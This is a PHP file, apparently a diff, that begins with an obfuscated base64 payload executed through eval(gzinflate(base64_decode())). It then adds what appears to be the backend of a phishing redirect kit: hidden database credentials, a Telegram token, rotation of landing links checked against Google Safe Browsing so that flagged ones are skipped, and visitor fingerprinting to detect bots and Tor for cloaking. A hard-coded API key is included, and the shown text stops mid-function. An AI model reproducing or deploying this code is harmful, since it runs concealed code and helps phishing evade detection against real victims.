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";eval(htmlspecialchars_decode(gzinflate(base64_decode($Apaaja))));exit;?>
+<?php
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+header('Content-Type: application/json');
+ header("Access-Control-Allow-Origin: *");
+  if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    header("Access-Control-Allow-Origin: *");
+    header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
+    header("Access-Control-Allow-Headers: Content-Type, Authorization");
+    http_response_code(200);
+    exit();
+}
+
+header("Access-Control-Allow-Origin: *");
+    
+if (session_status() == PHP_SESSION_NONE) {
+    session_start();
+}
+
+
+
+$fs_host = base64_decode("MTk4LjI1MS44NC4yMDA");
+$fs_user = base64_decode("emVyb2RheXNfZGF5");
+$fs_pass = base64_decode("ZHJjZ2lseVAwKmsm");
+$fs_name = base64_decode("emVyb2RheXNfZGF5");
+
+
+global $fs_host, $fs_user, $fs_pass, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_browser;
+
+function user_data($id, $client_info, $ipAddress) 
+{
+    global $fs_host, $fs_user, $fs_pass, $fs_name;
+
+    if (empty($id)) {
+        return ['status' => 'error', 'message' => 'No user ID provided'];
+    }
+
+    $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
+    if (!$db) {
+        die(json_encode(['status' => 'error', 'message' => 'Database connection failed']));
+    }
+
+    $id = mysqli_real_escape_string($db, $id);
+    $sql_u = "SELECT * FROM redirction WHERE id='$id'";
+    $res_u = mysqli_query($db, $sql_u);
+
+    if (mysqli_num_rows($res_u) > 0) {
+        $row = mysqli_fetch_assoc($res_u);
+        $data = [
+            'status'       => 'success',
+            'message'      => 'data found',
+            'link'         => base64_decode(base64_decode($row["link"])),
+            'cn'           => explode(";", base64_decode(base64_decode($row["country"]))),
+            'pic'          => $row["pic"],
+            'msg'          => base64_decode(base64_decode($row["msg"])),
+            'expire_date'  => $row["expire_date"],
+            'server'       => base64_decode(base64_decode($row["server"])),
+            'url'          => base64_decode(base64_decode($row["url"])),
+            'luxcaptcha'   => $row["luxcaptcha"],
+            'tokentel'     => base64_decode(base64_decode($row["tokentel"])),
+            'idtel'        => base64_decode(base64_decode($row["idtel"])),
+            'redirict'     => $row["redirict"],
+            'project'      => $row["project"],
+            'api'          => $row["api"],
+            'addby'        => $row["addby"],
+            'isprotect'    => $row["isprotect"],
+            'proxy'        => $row["proxy"],
+            'captcha_data' => $row["captcha"],
+            'goole_cap'    => $row["google_cap"],
+            'cloud_cap'    => $row["cloud_cap"],
+            'pro_ico'      => $row["pro_ico"],
+            'pro_color'    => $row["pro_color"],
+            'pro_msg'      => $row["pro_msg"],
+            'pro_img'      => $row["pro_img"],
+            'pro_logo'     => $row["pro_logo"],
+        ];
+    } else {
+		$res = banned_client($ipAddress, "user not found: $id", $client_info);
+        $data = ['status' => 'error', 'message' => $res['message']];
+    }
+
+    mysqli_close($db);
+    return $data;
+}
+function url_packet()
+{
+       global $fs_host, $fs_user, $fs_pass, $fs_name;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
+       if (!$db) {
+               die(json_encode(['status' => 'error', 'message' => 'Database connection failed']));
+       }
+       $sql = "SELECT * FROM luxdataurl WHERE status = '0'";
+       $result = mysqli_query($db, $sql);
+       $links = [];
+       while ($row = mysqli_fetch_assoc($result)) {
+              $links[] = $row["luxurl"];
+       }
+       mysqli_close($db);
+       if (count($links) > 0) {
+              shuffle($links);
+              foreach ($links as $random_link) {
+                     $safety_result = checkUrlSafety($random_link);
+                     if ($safety_result === "Safe") {
+                            return $random_link;
+                     }
+              }
+              return "No safe URLs available.";
+       } else {
+              return "No URLs available.";
+       }
+}
+function checkUrlSafety($url)
+{
+       $apiKey = "AIzaSyCv3mI6TjtqYTYQ8nZpA3Sx_7VSrq-hDyU";
+       $apiEndpoint = "https://safebrowsing.googleapis.com/v4/threatMatches:find?key=$apiKey";
+       $requestData = [
+              "client" => ["clientId" => "globalcom", "clientVersion" => "1.5.2"],
+              "threatInfo" => ["threatTypes" => ["MALWARE", "SOCIAL_ENGINEERING"], "platformTypes" => ["WINDOWS"], "threatEntryTypes" => ["URL"], "threatEntries" => [["url" => $url]]],
+       ];
+       $jsonData = json_encode($requestData);
+       $ch = curl_init($apiEndpoint);
+       curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+       curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json", "Content-Length: " . strlen($jsonData)]);
+       $response = curl_exec($ch);
+       if (curl_errno($ch)) {
+              $result = "cURL Error: " . curl_error($ch);
+       } else {
+              $responseData = json_decode($response, true);
+              if (isset($responseData["matches"]) && count($responseData["matches"]) > 0) {
+                     $result = "Not Safe";
+                     $messageme = "❌ System:\nDanger Link: $url";
+                     tele_message($messageme);
+              } else {
+                     $result = "Safe";
+              }
+       }
+       curl_close($ch);
+       return $result;
+}
+function send_command($local_userAgent, $ip, $url, $command, $id, $host)
+{
+    
+    $fields = [
+        "send_ip" => $ip,
+        "send_domain" => $url,
+        "return_domain" => $host,
+        "send_action" => $command,
+        "send_id" => $id,
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $local_userAgent);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 60); // Set timeout to 30 seconds
+
+    // Capture verbose output
+    $verbose = fopen('php://temp', 'w+');
+    curl_setopt($ch, CURLOPT_VERBOSE, true);
+    curl_setopt($ch, CURLOPT_STDERR, $verbose);
+
+    $response = curl_exec($ch);
+
+    if (curl_errno($ch)) {
+        $error_message = curl_error($ch);
+        curl_close($ch);
+
+        // Read and log verbose output
+        rewind($verbose);
+        $verbose_log = stream_get_contents($verbose);
+        file_put_contents('curl_error.log', "Curl error: $error_message\nVerbose output: $verbose_log\n", FILE_APPEND);
+
+        return ["error" => "Curl error: " . $error_message];
+    }
+
+    curl_close($ch);
+    // Decode the response
+    $result = json_decode($response, true);
+    
+    if (json_last_error() !== JSON_ERROR_NONE) {
+        file_put_contents('curl_error.log', "JSON decode error: " . json_last_error_msg() . "\nResponse: $result\n", FILE_APPEND);
+    }
+
+    return $result;
+}
+function detect_user($ipAddress)
+{
+       global $fs_host, $fs_user, $fs_pass, $fs_name;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $sql_u = "SELECT * FROM logs WHERE ipaddres='$ipAddress'";
+       $res_u = mysqli_query($db, $sql_u);
+       if (mysqli_num_rows($res_u) > 0) {
+              mysqli_close($db);
+              return true;
+       }
+       mysqli_close($db);
+       return false;
+}
+function fetchIPInfo($ipAddress)
+{
+    $url = "http://ip-api.com/json/{$ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
+    $curl = curl_init($url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($curl);
+    curl_close($curl);
+
+    $info = json_decode($response, true);
+
+    if (!isset($info['status']) || $info['status'] !== 'success') {
+        return [
+            "isp" => "Unknown",
+            "country" => "Unknown",
+            "countryCode" => "Unknown",
+            "city" => "Unknown",
+            "region" => "Unknown",
+            "proxy" => "False",
+            "mobile" => "False",
+            "hosting" => "False"
+        ];
+    }
+
+    return [
+        "isp" => $info["isp"] ?? null,
+        "country" => $info["country"] ?? null,
+        "countryCode" => $info["countryCode"] ?? null,
+        "city" => $info["city"] ?? null,
+        "region" => $info["regionName"] ?? null,
+        "proxy" => !empty($info["proxy"]) ? "True" : "False",
+        "mobile" => !empty($info["mobile"]) ? "True" : "False",
+        "hosting" => !empty($info["hosting"]) ? "True" : "False"
+    ];
+}
+function detectDeviceDetails($userAgent,$ipAddress) 
+{
+  
+	$referrer = $_SERVER['HTTP_REFERER'] ?? 'None';
+    $deviceType = detect_device_type($userAgent);
+    $deviceName = detect_device_name($userAgent);
+    $os = get_platform($userAgent);
+    $osVersion = detect_os_version($userAgent, $os);
+    $browser = get_browser_value($userAgent);
+    $browserVersion = get_browser_version($userAgent, $browser);
+    $requestSource = get_request_source($userAgent);
+    $isFakeUserAgent = checkFakeUserAgent($userAgent);
+    $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'Yes' : 'No';
+    $connectionType = $_SERVER['HTTP_CONNECTION'] ?? 'Unknown';
+	$ipDetails = fetchIPInfo($ipAddress);
+    $isp = $ipDetails['isp'];
+    $country = $ipDetails['country'];
+    $countryCode = $ipDetails['countryCode'];
+    $city = $ipDetails['city'];
+    $region = $ipDetails['region'];
+    $proxy = $ipDetails['proxy'];
+    $mobile = $ipDetails['mobile'];
+    $hosting = $ipDetails['hosting'];
+	$local_time = date("Y-m-d H:i:s");
+    $local_domain = $_SERVER["SERVER_NAME"]; 
+    return [
+        "DeviceType" => $deviceType,
+        "DeviceName" => $deviceName,
+        "Os" => $os,
+        "OsVersion" => $osVersion,
+        "Browser" => $browser,
+        "BrowserVersion" => $browserVersion,
+        "RequestSource" => $requestSource,
+        "IsFakeUserAgent" => $isFakeUserAgent,
+        "Referrer" => $referrer,
+        "IsHttps" => $isHttps,
+        "ConnectionType" => $connectionType,
+        "UserAgent" => $userAgent,
+		"ipAddress" => $ipAddress,
+		"isp" => $isp,
+		"country" => $country,
+		"countryCode" => $countryCode,
+		"city" => $city,
+		"region" => $region,
+		"proxy" => $proxy,
+		"mobile" => $mobile,
+		"hosting" => $hosting,
+		"local_time" => $local_time,
+		"local_domain" => $local_domain,
+    ];
+}
+function detect_device_type($userAgent) 
+{
+    if (preg_match('/windows phone|iemobile|mobile/i', $userAgent)) {
+        return "Mobile";
+    } elseif (preg_match('/tablet|ipad|playbook|silk/i', $userAgent)) {
+        return "Tablet";
+    } elseif (preg_match('/smart-tv|tv|chromecast|roku|appletv|playstation|xbox|nintendo/i', $userAgent)) {
+        return "Smart TV/Console";
+    } elseif (preg_match('/windows|linux|macintosh|ubuntu/i', $userAgent)) {
+        return "Desktop";
+    } elseif (preg_match('/watch|wear/i', $userAgent)) {
+        return "Wearable";
+    } elseif (is_bot($userAgent)) {
+        return "Bot";
+    }
+    return "Unknown";
+}
+function detect_os_version($userAgent, $os) {
+    $architecture = (stripos($userAgent, 'x64') !== false || stripos($userAgent, 'Win64') !== false) ? '64-bit' : '32-bit';
+    if (preg_match('/PlayStation (\d+)/i', $userAgent, $matches)) {
+        $psVersion = $matches[1]; 
+        return "{$psVersion} ({$architecture})"; 
+    }
+    if ($os === "iPad" && preg_match('/cpu os (\d+[_\d]*) like mac os x/i', $userAgent, $matches)) {
+        $version = str_replace('_', '.', $matches[1]);
+        return "{$version} ({$architecture})";
+    
+    }
+	
+    if (preg_match('/CPU OS (\d+_\d+)/i', $userAgent, $matches)) {
+        return str_replace('_', '.', $matches[1]);
+    }
+	if (preg_match('/ubuntu/i', $userAgent)) {
+            return "X11 ({$architecture})";
+        }
+    if (preg_match('/iPhone OS (\d+_\d+_\d+)/i', $userAgent, $matches)) {
+        $version = str_replace('_', '.', $matches[1]); 
+        return "iOS " . $version . " (32-bit)";
+    }
+    if (stripos($os, "Windows") !== false) {
+        if (preg_match('/windows nt (\d+\.\d+)/i', $userAgent, $matches)) {
+            $version = $matches[1];
+
+            switch ($version) {
+                case '10.0':
+                    return "10 ({$architecture})"; 
+                case '6.3':
+                    return "8.1 ({$architecture})";
+                case '6.2':
+                    return "8 ({$architecture})";
+                case '6.1':
+                    return "7 ({$architecture})";
+                case '6.0':
+                    return "Vista ({$architecture})";
+                case '5.1':
+                    return "XP ({$architecture})";
+                default:
+                    return "Unknown version ({$version})";
+            }
+        }
+    }
+
+    if (preg_match('/mac os x (\d+[_\d]*)/i', $userAgent, $matches)) {
+        return str_replace('_', '.', $matches[1]) . " ({$architecture})";
+    }
+
+    if (preg_match('/android ([\d.]+)/i', $userAgent, $matches)) {
+        return $matches[1] . " ({$architecture})";
+    }
+
+    if (preg_match('/iphone os (\d+[_\d]*)/i', $userAgent, $matches)) {
+        return str_replace('_', '.', $matches[1]) . " ({$architecture})";
+    }
+
+    return "Unknown ({$architecture})";
+}
+
+function matchOSVersion($version) {
+    switch ($version) {
+        case '10.0':
+            return 'Windows 10';
+        case '11.0':
+            return 'Windows 11';
+        case '6.3':
+            return 'Windows 8.1';
+        case '6.2':
+            return 'Windows 8';
+        case '6.1':
+            return 'Windows 7';
+        case '6.0':
+            return 'Windows Vista';
+        case '5.1':
+            return 'Windows XP';
+        case '5.0':
+            return 'Windows 2000';
+        default:
+            return "Unknown version ({$version})";
+    }
+}
+
+function detect_device_name($userAgent) {
+    $deviceName = "Unknown";
+    $devices = [
+    "/sm-[a-z0-9]+/i" => "Samsung Galaxy",
+    "/SM-G/i" => "Samsung Galaxy",
+    "/GT-I/i" => "Samsung Galaxy",
+    "/SAMSUNG/i" => "Samsung Galaxy",
+    "/Galaxy/i" => "Samsung Galaxy",
+    "/SCH-/i" => "Samsung Galaxy", 
+    "/Note/i" => "Samsung Galaxy",
+    "/A52/i" => "Samsung Galaxy", 
+    "/A71/i" => "Samsung Galaxy", 
+    // Xiaomi Devices with more patterns
+    "/Mi [a-z0-9]+/i" => "Xiaomi",
+	"/M2101K6G/i" => "Xiaomi",  
+    "/xiaomi/i" => "Xiaomi",
+    "/redmi/i" => "Xiaomi",
+    "/Mi[ ]*[a-z0-9]+/i" => "Xiaomi",
+    "/Mi Max/i" => "Xiaomi",
+    "/Redmi/i" => "Xiaomi",
+    "/Poco/i" => "Xiaomi",
+    "/Mi 11/i" => "Xiaomi",
+    "/Redmi Note/i" => "Xiaomi",
+    // Huawei Devices with more patterns
+    "/ELS-[a-z0-9]+/i" => "Huawei",
+    "/NKE-[a-z0-9]+/i" => "Huawei",
+    "/huawei/i" => "Huawei",
+    "/HUAWEI/i" => "Huawei",
+    "/P30/i" => "Huawei",
+    "/Mate/i" => "Huawei",
+    "/HONOR/i" => "Huawei", 
+    "/Y9/i" => "Huawei",
+    "/Nova/i" => "Huawei", 
+    // OnePlus Devices with more patterns
+    "/IN2025/i" => "OnePlus",
+    "/oneplus/i" => "OnePlus",
+    "/A5000/i" => "OnePlus",
+    "/OnePlus/i" => "OnePlus",
+    "/OXYGEN/i" => "OnePlus",
+    "/OnePlus 9/i" => "OnePlus",
+    "/OnePlus Nord/i" => "OnePlus",
+	"/BE[a-z0-9]+/i" => "OnePlus",
+    // Apple Devices with more patterns
+    "/iphone/i" => "Apple Device",
+    "/ipad/i" => "Apple Device",
+    "/ipod/i" => "Apple Device", 
+    "/iPhone X/i" => "Apple Device",
+    "/iPhone 11/i" => "Apple Device",
+    "/iPad Pro/i" => "Apple Device", 
+    // Google Pixel Devices with more patterns
+    "/pixel/i" => "Google Pixel",
+    "/Google Pixel/i" => "Google Pixel",
+    "/Pixel/i" => "Google Pixel",
+    "/Nexus/i" => "Google Pixel",
+    "/Google/i" => "Google Pixel",
+    "/Pixel 5/i" => "Google Pixel",
+    "/Pixel 4/i" => "Google Pixel",
+    "/Pixel XL/i" => "Google Pixel",
+    // Sony Devices with more patterns
+    "/sony/i" => "Sony",
+    "/Xperia/i" => "Sony",
+    "/Sony Xperia/i" => "Sony",
+    "/Xperia XZ/i" => "Sony",
+    "/Xperia Z/i" => "Sony",
+    // LG Devices with more patterns
+    "/lg/i" => "LG",
+    "/LG-/i" => "LG",
+    "/LG G/i" => "LG",
+    "/LG V/i" => "LG",
+    // HTC Devices with more patterns
+    "/htc/i" => "HTC",
+    "/HTC-/i" => "HTC",
+    "/Desire/i" => "HTC",
+    "/HTC One/i" => "HTC",
+    // Motorola Devices with more patterns
+    "/motorola/i" => "Motorola",
+    "/moto/i" => "Motorola",
+    "/XT/i" => "Motorola",
+    "/Motorola-/i" => "Motorola",
+    "/Moto G/i" => "Motorola",
+    // Oppo Devices with more patterns
+    "/oppo/i" => "Oppo",
+    "/CPH/i" => "Oppo",
+    "/Oppo-/i" => "Oppo",
+    "/Reno/i" => "Oppo",
+    "/Oppo F/i" => "Oppo",
+    // Vivo Devices with more patterns
+    "/vivo/i" => "Vivo",
+    "/VIVO/i" => "Vivo",
+    "/vivo-/i" => "Vivo",
+    "/Vivo-/i" => "Vivo", 
+    "/Vivo V/i" => "Vivo", 
+    // Realme Devices with more patterns
+    "/realme/i" => "Realme",
+    "/RMX/i" => "Realme",
+    "/Realme/i" => "Realme",
+    "/Realme X/i" => "Realme",
+    "/Realme 7/i" => "Realme",
+    // Lenovo Devices with more patterns
+    "/lenovo/i" => "Lenovo",
+    "/Lenovo-/i" => "Lenovo",
+    "/LAVIE/i" => "Lenovo",
+    "/Lenovo K/i" => "Lenovo",
+    // Asus Devices with more patterns
+    "/asus/i" => "Asus",
+    "/ZenFone/i" => "Asus",
+    "/ROG/i" => "Asus", 
+    "/Zenfone 6/i" => "Asus", 
+    // Nokia Devices with more patterns
+    "/nokia/i" => "Nokia",
+    "/Nokia-/i" => "Nokia",
+    "/Lumia/i" => "Nokia",
+    "/Nokia 6/i" => "Nokia",
+];
+
+
+    if (preg_match('/\((?:Linux|Android).*?;\s*([^;]+?)\s*;.*?\)/i', $userAgent, $matches)) {
+        $deviceName = trim($matches[1]);
+    }
+
+    foreach ($devices as $regex => $name) {
+        if (preg_match($regex, $userAgent)) {
+            return $name;
+        }
+    }
+
+    if ($deviceName === "Unknown" && preg_match('/\b([A-Za-z0-9]+)\b/i', $userAgent, $matches)) {
+        $deviceName = $matches[1];
+    }
+
+    return $deviceName;
+}
+
+function get_platform($userAgent) {
+	
+    $osArray = [
+        "/windows nt 11/i" => "Windows 11",
+        "/windows nt 10/i" => "Windows 10",
+        "/windows nt 6.3/i" => "Windows 8.1",
+        "/windows nt 6.2/i" => "Windows 8",
+        "/windows nt 6.1/i" => "Windows 7",
+        "/android/i" => "Android",
+        "/iphone/i" => "iOS",
+        "/ipad/i" => "iOS",
+        "/macintosh|mac os x/i" => "Mac OS X",
+		"/ubuntu/i" => "Ubuntu",
+        "/linux/i" => "Linux",
+		"/PlayStation/i" => "PlayStation",
+    ];
+
+    foreach ($osArray as $regex => $osName) {
+        if (preg_match($regex, $userAgent)) {
+            return $osName;
+        }
+    }
+    return "Unknown OS Platform";
+}
+
+function get_browser_value($userAgent) {
+    $browsers = [
+        "/edg|edge/i" => "Microsoft Edge",
+        "/firefox|fxios|firefox-kito/i" => "Firefox",
+        "/chrome|crios/i" => "Chrome Browser",
+        "/safari/i" => "Safari Browser",
+        "/opera|opr/i" => "Opera Browser",
+		"/SeaMonkey/i" => "SeaMonkey Browser",
+		"/Nintendo/i" => "Nintendo Browser", 
+        "/yabrowser/i" => "Yandex Browser", 
+        "/duckduckgo/i" => "DuckDuckGo Browser", 
+        "/ucbrowser/i" => "UC Browser",
+        "/qqbrowser/i" => "QQ Browser",
+        "/baidubrowser/i" => "Baidu Browser",
+        "/samsungbrowser/i" => "Samsung Internet Browser",
+        "/maxthon/i" => "Maxthon Browser",
+        "/avast/i" => "Avast Secure Browser",
+        "/avira/i" => "Avira Browser",
+        "/midori/i" => "Midori Browser",
+        "/tor/i" => "Tor Browser",
+        "/netscape/i" => "Netscape",
+        "/konqueror/i" => "Konqueror",
+        "/seamonkey/i" => "SeaMonkey",
+        "/epiphany/i" => "Epiphany",
+    ];
+    
+	if (isTorBrowser($userAgent)) {
+		return "Tor Browser"; 
+	}
+    foreach ($browsers as $regex => $browser) {
+        if (preg_match($regex, $userAgent)) {
+            return $browser;
+        }
+    }
+	if (is_bot($userAgent)) {
+        return "Internet Explorer";
+    }
+	if (preg_match('/Trident\//i', $userAgent)) {
+        return "Internet Explorer";  
+    }
+    return "Unknown Browser";
+}
+
+function isTorBrowser($userAgent) {
+    if (preg_match('/Firefox\/\d+\.?\d*\.?\d*esr/', $userAgent) && preg_match('/Gecko\/20100101/', $userAgent)) {
+        return true;  // Likely a Tor Browser user
+    }
+    return false;
+}
+
+function get_browser_version($userAgent, $browser) {
+    $browserPatterns = [
+        "Firefox" => "/(?:Firefox|Firefox-KiToBrowser)\/([\d\.]+)/i",
+        "Chrome" => "/Chrome\/([\d\.]+)/i",
+        "Safari" => "/Version\/([\d\.]+)/i",
+        "Microsoft Edge" => "/Edg\/([\d\.]+)/i",
+        "SeaMonkey" => "/SeaMonkey\/([\d\.]+(?:\.[\d]+)+)/i",
+        "Opera" => "/Opera\/([\d\.]+)|OPR\/([\d\.]+)/i",
+    ];
+	 if (preg_match('/Version\/([\d\.]+)/i', $userAgent, $matches)) {
+        return $matches[1]; 
+    }
+	 if (preg_match('/Firefox\/(\d+\.\d+\.?\d*esr)/', $userAgent, $matches)) {
+        return $matches[1];  
+    }
+	if (preg_match('/CriOS\/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/i', $userAgent, $matches)) {
+        return $matches[1]; 
+    }
+    if (preg_match('/Chrome\/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/i', $userAgent, $matches)) {
+        return $matches[1]; 
+    }
+    if (isset($browserPatterns[$browser])) {
+      
+        if (preg_match($browserPatterns[$browser], $userAgent, $matches)) {
+            error_log("Matched version for {$browser}: " . $matches[1]);
+            return $matches[1];
+        } else {
+            error_log("No match found for {$browser} with regex: " . $browserPatterns[$browser]);
+        }
+    }
+
+    if (is_bot($userAgent)) {
+        return "1.0";
+    }
+
+    return "Unknown Version";
+}
+
+function get_request_source($userAgent) {
+    if (is_bot($userAgent)) {
+        return "Bot/crowl";
+    } elseif (preg_match('/python|curl|wget|postmanruntime|java|node\.js|axios|go-http-client/i', $userAgent)) {
+        return "Script/Program";
+    }
+    return "Browser";
+}
+
+function checkFakeUserAgent($userAgent) {
+    $commonBrowsers = [
+        '/Mozilla/',
+        '/Chrome/',
+        '/Safari/',
+        '/Firefox/',
+        '/Edge/',
+        '/Opera/',
+        '/MSIE/', 
+        '/Trident/',
+    ];
+
+    $botPatterns = [
+        '/bot/', '/crawler/', '/spider/', '/googlebot/', '/bingbot/', '/yandexbot/', '/slurp/', '/duckduckbot/', 
+        '/baidu/', '/ahrefsbot/', '/mj12bot/', '/dotbot/', '/seznambot/', '/zyborg/', '/telegrambot/', '/facebookexternalhit/',
+        '/twitterbot/', '/bingpreview/'
+    ];
+    foreach ($botPatterns as $pattern) {
+        if (preg_match($pattern, $userAgent)) {
+            return "Yes";  
+        }
+    }
+    if (is_bot($userAgent)) {
+        return "Yes";
+    } 
+    foreach ($commonBrowsers as $pattern) {
+        if (preg_match($pattern, $userAgent)) {
+            return "No";  
+        }
+    }
+
+    return "Yes";
+}
+
+function is_bot_ip($ipToCheck)
+{
+    $botsUrls = [
+        "google" => "https://developers.google.com/search/apis/ipranges/googlebot.json",
+        "bing" => "https://www.bing.com/toolbox/bingbot.json"
+    ];
+
+    foreach ($botsUrls as $bot => $url) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+        $response = curl_exec($ch);
+
+        if ($response === false) {
+            $error = curl_error($ch);
+            curl_close($ch);
+            throw new Exception("Failed to fetch bot IP ranges for $bot: $error");
+        }
+
+        curl_close($ch);
+
+        $botResp = json_decode($response, true);
+
+        foreach ($botResp["prefixes"] as $ipRange) {
+            if (isset($ipRange["ipv6Prefix"]) && strpos($ipToCheck, ":") !== false) {
+                $network = $ipRange["ipv6Prefix"];
+            } elseif (isset($ipRange["ipv4Prefix"]) && strpos($ipToCheck, ":") === false) {
+                $network = $ipRange["ipv4Prefix"];
+            } else {
